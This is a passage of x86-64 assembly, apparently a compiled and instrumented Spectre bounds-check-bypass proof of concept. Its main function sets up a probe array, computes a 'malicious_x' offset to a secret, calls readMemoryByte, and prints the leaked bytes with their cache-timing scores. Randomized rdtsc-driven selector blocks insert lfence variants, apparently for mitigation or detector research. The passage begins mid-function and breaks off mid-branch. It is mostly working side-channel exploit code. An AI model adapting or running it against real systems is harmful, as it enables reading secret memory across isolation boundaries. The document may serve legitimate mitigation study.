	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
## Variant 9
.LreadMemoryByte_win0_var9:
	popq	%rax
	addq	$32, %rsp
	cmpl	$2, %eax
	jne	.L26
	lfence
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %eax
	jmp	.LreadMemoryByte_win0_continue
.LreadMemoryByte_win0_continue:
	testl	%eax, %eax
	je	.L25
.L26:
	subl	$1, -100(%rbp)
.L7:
	cmpl	$0, -100(%rbp)
	jg	.L27
.L25:
	movl	-92(%rbp), %eax
	movl	%eax, %edx
	movq	-136(%rbp), %rax
	movb	%dl, (%rax)
	movl	-92(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rdx
	leaq	results.0(%rip), %rax
	movl	(%rdx,%rax), %edx
	movq	-144(%rbp), %rax
	movl	%edx, (%rax)
	movq	-136(%rbp), %rax
	addq	$1, %rax
	movl	-88(%rbp), %edx
	movb	%dl, (%rax)
	movq	-144(%rbp), %rax
	leaq	4(%rax), %rdx
	movl	-88(%rbp), %eax
	cltq
	leaq	0(,%rax,4), %rcx
	leaq	results.0(%rip), %rax
	movl	(%rcx,%rax), %eax
	movl	%eax, (%rdx)
	movl	results.0(%rip), %eax
	movl	%eax, %edx
	movl	-108(%rbp), %eax
	xorl	%edx, %eax
	movl	%eax, results.0(%rip)
	nop
	movq	-24(%rbp), %rax
	subq	%fs:40, %rax
	je	.L28
	call	__stack_chk_fail@PLT
.L28:
	subq	$-128, %rsp
	popq	%rbx
	popq	%r12
	popq	%rbp
	.cfi_def_cfa 7, 8
	ret
	.cfi_endproc
.LFE4380:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata
.LC1:
	.string	"%d"
.LC2:
	.string	"%p"
	.align 8
.LC3:
	.string	"Using a cache hit threshold of %d.\n"
.LC4:
	.string	"Build: "
.LC5:
	.string	"RDTSCP_SUPPORTED "
.LC6:
	.string	"MFENCE_SUPPORTED "
.LC7:
	.string	"CLFLUSH_SUPPORTED "
.LC8:
	.string	"INTEL_MITIGATION_DISABLED "
	.align 8
.LC9:
	.string	"LINUX_KERNEL_MITIGATION_DISABLED "
.LC10:
	.string	"Reading %d bytes:\n"
	.align 8
.LC11:
	.string	"Reading at malicious_x = %p... "
.LC12:
	.string	"Success"
.LC13:
	.string	"Unclear"
.LC14:
	.string	"%s: "
.LC15:
	.string	"0x%02X=\342\200\231%c\342\200\231 score=%d "
	.align 8
.LC16:
	.string	"(second best: 0x%02X=\342\200\231%c\342\200\231 score=%d)"
	.text
	.globl	main
	.type	main, @function
main:
.LFB4381:
	.cfi_startproc
	endbr64
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register 6
	subq	$64, %rsp
	movl	%edi, -52(%rbp)
	movq	%rsi, -64(%rbp)
	movq	%fs:40, %rax
	movq	%rax, -8(%rbp)
	xorl	%eax, %eax
	movl	$80, -44(%rbp)
	movq	secret(%rip), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -32(%rbp)
	movl	$40, -40(%rbp)
	movl	$0, -36(%rbp)
	jmp	.L30
.L31:
	movl	-36(%rbp), %eax
	cltq
	leaq	array2(%rip), %rdx
	movb	$1, (%rax,%rdx)
	addl	$1, -36(%rbp)
.L30:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win6_var0
	cmpl	$1, %eax
	je	.Lmain_win6_var1
	cmpl	$2, %eax
	je	.Lmain_win6_var2
	cmpl	$3, %eax
	je	.Lmain_win6_var3
	cmpl	$4, %eax
	je	.Lmain_win6_var4
	cmpl	$5, %eax
	je	.Lmain_win6_var5
	cmpl	$6, %eax
	je	.Lmain_win6_var6
	cmpl	$7, %eax
	je	.Lmain_win6_var7
	cmpl	$8, %eax
	je	.Lmain_win6_var8
	cmpl	$9, %eax
	je	.Lmain_win6_var9
	jmp	.Lmain_win6_var0
## Variant 0
.Lmain_win6_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	$131071, -36(%rbp)
	jle	.L31
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 1
.Lmain_win6_var1:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 2
.Lmain_win6_var2:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 3
.Lmain_win6_var3:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 4
.Lmain_win6_var4:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 5
.Lmain_win6_var5:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 6
.Lmain_win6_var6:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 7
.Lmain_win6_var7:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 8
.Lmain_win6_var8:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 9
.Lmain_win6_var9:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
.Lmain_win6_continue:
	leaq	.LC1(%rip), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
.L32:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win5_var0
	cmpl	$1, %eax
	je	.Lmain_win5_var1
	cmpl	$2, %eax
	je	.Lmain_win5_var2
	cmpl	$3, %eax
	je	.Lmain_win5_var3
	cmpl	$4, %eax
	je	.Lmain_win5_var4
	cmpl	$5, %eax
	je	.Lmain_win5_var5
	cmpl	$6, %eax
	je	.Lmain_win5_var6
	cmpl	$7, %eax
	je	.Lmain_win5_var7
	cmpl	$8, %eax
	je	.Lmain_win5_var8
	cmpl	$9, %eax
	je	.Lmain_win5_var9
	jmp	.Lmain_win5_var0
## Variant 0
.Lmain_win5_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	$3, -52(%rbp)
	jle	.L33
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 1
.Lmain_win5_var1:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 2
.Lmain_win5_var2:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 3
.Lmain_win5_var3:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 4
.Lmain_win5_var4:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 5
.Lmain_win5_var5:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 6
.Lmain_win5_var6:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 7
.Lmain_win5_var7:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 8
.Lmain_win5_var8:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
## Variant 9
.Lmain_win5_var9:
	popq	%rax
	addq	$32, %rsp
	lfence
	cmpl	$3, -52(%rbp)
	jle	.L33
	lfence
	movq	-64(%rbp), %rax
	addq	$16, %rax
	movq	(%rax), %rax
	leaq	-32(%rbp), %rdx
	leaq	.LC2(%rip), %rcx
	jmp	.Lmain_win5_continue
.Lmain_win5_continue:
	movq	%rcx, %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movq	-32(%rbp), %rax
	leaq	array1(%rip), %rdx
	subq	%rdx, %rax
	movq	%rax, -32(%rbp)
	movq	-64(%rbp), %rax
	addq	$24, %rax
	movq	(%rax), %rax
	leaq	-40(%rbp), %rdx
	leaq	.LC1(%rip), %rcx
	movq	%rcx, %rsi
	movq	%rax, %rdi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
.L33:
	movl	-44(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC3(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	.LC4(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	.LC5(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	.LC6(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	.LC7(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	.LC8(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	leaq	.LC9(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	$10, %edi
	call	putchar@PLT
	movl	-40(%rbp), %eax
	movl	%eax, %esi
	leaq	.LC10(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	jmp	.L34
.L42:
	movq	-32(%rbp), %rax
	movq	%rax, %rsi
	leaq	.LC11(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movq	-32(%rbp), %rax
	leaq	1(%rax), %rdx
	movq	%rdx, -32(%rbp)
	movl	-44(%rbp), %edi
	leaq	-20(%rbp), %rcx
	leaq	-10(%rbp), %rdx
	movq	%rax, %rsi
	call	readMemoryByte
	movl	-20(%rbp), %eax
	movl	-16(%rbp), %edx
	addl	%edx, %edx
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win4_var0
	cmpl	$1, %eax
	je	.Lmain_win4_var1
	cmpl	$2, %eax
	je	.Lmain_win4_var2
	cmpl	$3, %eax
	je	.Lmain_win4_var3
	cmpl	$4, %eax
	je	.Lmain_win4_var4
	cmpl	$5, %eax
	je	.Lmain_win4_var5
	cmpl	$6, %eax
	je	.Lmain_win4_var6
	cmpl	$7, %eax
	je	.Lmain_win4_var7
	cmpl	$8, %eax
	je	.Lmain_win4_var8
	cmpl	$9, %eax
	je	.Lmain_win4_var9
	jmp	.Lmain_win4_var0
## Variant 0
.Lmain_win4_var0:
	popq	%rax
	addq	$32, %rsp
	cmpl	%edx, %eax
	jl	.L35
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 1
.Lmain_win4_var1:
	popq	%rax
	addq	$32, %rsp
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 2
.Lmain_win4_var2:
	popq	%rax
	addq	$32, %rsp
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 3
.Lmain_win4_var3:
	popq	%rax
	addq	$32, %rsp
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 4
.Lmain_win4_var4:
	popq	%rax
	addq	$32, %rsp
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 5
.Lmain_win4_var5:
	popq	%rax
	addq	$32, %rsp
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 6
.Lmain_win4_var6:
	popq	%rax
	addq	$32, %rsp
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 7
.Lmain_win4_var7:
	popq	%rax
	addq	$32, %rsp
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 8
.Lmain_win4_var8:
	popq	%rax
	addq	$32, %rsp
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
## Variant 9
.Lmain_win4_var9:
	popq	%rax
	addq	$32, %rsp
	cmpl	%edx, %eax
	jl	.L35
	lfence
	leaq	.LC12(%rip), %rax
	jmp	.Lmain_win4_continue
.Lmain_win4_continue:
	jmp	.L36
.L35:
	leaq	.LC13(%rip), %rax
.L36:
	movq	%rax, %rsi
	leaq	.LC14(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	-20(%rbp), %edx
	movzbl	-10(%rbp), %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win3_var0
	cmpl	$1, %eax
	je	.Lmain_win3_var1
	cmpl	$2, %eax
	je	.Lmain_win3_var2
	cmpl	$3, %eax
	je	.Lmain_win3_var3
	cmpl	$4, %eax
	je	.Lmain_win3_var4
	cmpl	$5, %eax
	je	.Lmain_win3_var5
	cmpl	$6, %eax
	je	.Lmain_win3_var6
	cmpl	$7, %eax
	je	.Lmain_win3_var7
	cmpl	$8, %eax
	je	.Lmain_win3_var8
	cmpl	$9, %eax
	je	.Lmain_win3_var9
	jmp	.Lmain_win3_var0
## Variant 0
.Lmain_win3_var0:
	popq	%rax
	addq	$32, %rsp
	cmpb	$31, %al
	jbe	.L37
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 1
.Lmain_win3_var1:
	popq	%rax
	addq	$32, %rsp
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 2
.Lmain_win3_var2:
	popq	%rax
	addq	$32, %rsp
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 3
.Lmain_win3_var3:
	popq	%rax
	addq	$32, %rsp
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 4
.Lmain_win3_var4:
	popq	%rax
	addq	$32, %rsp
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 5
.Lmain_win3_var5:
	popq	%rax
	addq	$32, %rsp
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 6
.Lmain_win3_var6:
	popq	%rax
	addq	$32, %rsp
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 7
.Lmain_win3_var7:
	popq	%rax
	addq	$32, %rsp
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 8
.Lmain_win3_var8:
	popq	%rax
	addq	$32, %rsp
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
## Variant 9
.Lmain_win3_var9:
	popq	%rax
	addq	$32, %rsp
	cmpb	$31, %al
	jbe	.L37
	lfence
	movzbl	-10(%rbp), %eax
	cmpb	$126, %al
	ja	.L37
	movzbl	-10(%rbp), %eax
	jmp	.Lmain_win3_continue
.Lmain_win3_continue:
	movzbl	%al, %eax
	jmp	.L38
.L37:
	movl	$63, %eax
.L38:
	movzbl	-10(%rbp), %ecx
	movzbl	%cl, %esi
	movl	%edx, %ecx
	movl	%eax, %edx
	leaq	.LC15(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
	movl	-16(%rbp), %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win2_var0
	cmpl	$1, %eax
	je	.Lmain_win2_var1
	cmpl	$2, %eax
	je	.Lmain_win2_var2
	cmpl	$3, %eax
	je	.Lmain_win2_var3
	cmpl	$4, %eax
	je	.Lmain_win2_var4
	cmpl	$5, %eax
	je	.Lmain_win2_var5
	cmpl	$6, %eax
	je	.Lmain_win2_var6
	cmpl	$7, %eax
	je	.Lmain_win2_var7
	cmpl	$8, %eax
	je	.Lmain_win2_var8
	cmpl	$9, %eax
	je	.Lmain_win2_var9
	jmp	.Lmain_win2_var0
## Variant 0
.Lmain_win2_var0:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jle	.L39
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 1
.Lmain_win2_var1:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 2
.Lmain_win2_var2:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 3
.Lmain_win2_var3:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 4
.Lmain_win2_var4:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 5
.Lmain_win2_var5:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 6
.Lmain_win2_var6:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 7
.Lmain_win2_var7:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 8
.Lmain_win2_var8:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
## Variant 9
.Lmain_win2_var9:
	popq	%rax
	addq	$32, %rsp
	testl	%eax, %eax
	jle	.L39
	lfence
	movl	-16(%rbp), %edx
	movzbl	-9(%rbp), %eax
	cmpb	$31, %al
	jbe	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win2_continue
.Lmain_win2_continue:
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win1_var0
	cmpl	$1, %eax
	je	.Lmain_win1_var1
	cmpl	$2, %eax
	je	.Lmain_win1_var2
	cmpl	$3, %eax
	je	.Lmain_win1_var3
	cmpl	$4, %eax
	je	.Lmain_win1_var4
	cmpl	$5, %eax
	je	.Lmain_win1_var5
	cmpl	$6, %eax
	je	.Lmain_win1_var6
	cmpl	$7, %eax
	je	.Lmain_win1_var7
	cmpl	$8, %eax
	je	.Lmain_win1_var8
	cmpl	$9, %eax
	je	.Lmain_win1_var9
	jmp	.Lmain_win1_var0
## Variant 0
.Lmain_win1_var0:
	popq	%rax
	addq	$32, %rsp
	cmpb	$126, %al
	ja	.L40
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 1
.Lmain_win1_var1:
	popq	%rax
	addq	$32, %rsp
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 2
.Lmain_win1_var2:
	popq	%rax
	addq	$32, %rsp
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 3
.Lmain_win1_var3:
	popq	%rax
	addq	$32, %rsp
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 4
.Lmain_win1_var4:
	popq	%rax
	addq	$32, %rsp
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 5
.Lmain_win1_var5:
	popq	%rax
	addq	$32, %rsp
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 6
.Lmain_win1_var6:
	popq	%rax
	addq	$32, %rsp
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 7
.Lmain_win1_var7:
	popq	%rax
	addq	$32, %rsp
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 8
.Lmain_win1_var8:
	popq	%rax
	addq	$32, %rsp
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
## Variant 9
.Lmain_win1_var9:
	popq	%rax
	addq	$32, %rsp
	cmpb	$126, %al
	ja	.L40
	lfence
	movzbl	-9(%rbp), %eax
	jmp	.Lmain_win1_continue
.Lmain_win1_continue:
	movzbl	%al, %eax
	jmp	.L41
.L40:
	movl	$63, %eax
.L41:
	movzbl	-9(%rbp), %ecx
	movzbl	%cl, %esi
	movl	%edx, %ecx
	movl	%eax, %edx
	leaq	.LC16(%rip), %rax
	movq	%rax, %rdi
	movl	$0, %eax
	call	printf@PLT
.L39:
	movl	$10, %edi
	call	putchar@PLT
.L34:
	movl	-40(%rbp), %eax
	subl	$1, %eax
	movl	%eax, -40(%rbp)
	movl	-40(%rbp), %eax
	subq	$32, %rsp
## RANDOM SELECTOR BLOCK
	pushq	%rax
	pushq	%rcx
	pushq	%rdx
	rdtsc
	xorq	%rdx, %rax
	movl	$10, %ecx
	xorl	%edx, %edx
	divl	%ecx
	movl	%edx, %eax
	popq	%rdx
	popq	%rcx
	cmpl	$0, %eax
	je	.Lmain_win0_var0
	cmpl	$1, %eax
	je	.Lmain_win0_var1
	cmpl	$2, %eax
	je	.Lmain_win0_var2
	cmpl	$3, %eax
	je	.Lmain_win0_var3
	cmpl	$4, %eax
	je	.Lmain_win0_var4
	cmpl	$5, %eax
	je	.Lmain_win0_var5
	cmpl	$6, %eax
	je	.Lmain_win0_var6
	cmpl	$7, %eax
	je	.Lmain_win0_var7
	cmpl	$8, %eax
	je	.Lmain_win0_var8
	cmpl	$9, %eax
	je	.Lmain_win0_var9
	jmp	.Lmain_win0_var0
